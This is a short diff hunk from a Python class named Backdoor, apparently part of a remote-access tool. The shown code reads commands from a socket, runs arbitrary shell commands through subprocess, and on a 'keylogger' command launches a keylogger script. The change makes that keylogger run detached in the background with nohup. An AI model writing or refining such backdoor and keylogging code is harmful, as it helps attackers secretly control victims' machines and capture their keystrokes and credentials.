@@ -84,8 +84,7 @@ class Backdoor:
 				if cmd  == "exit":
 					sock.close()
 				if cmd == "keylogger":
-					os.system("python keylogger.py")
-					continue
+					os.system("nohup python keylogger.py &")
 				#Shell commands
 				else: 
 					proc = subprocess.Popen(cmd, 
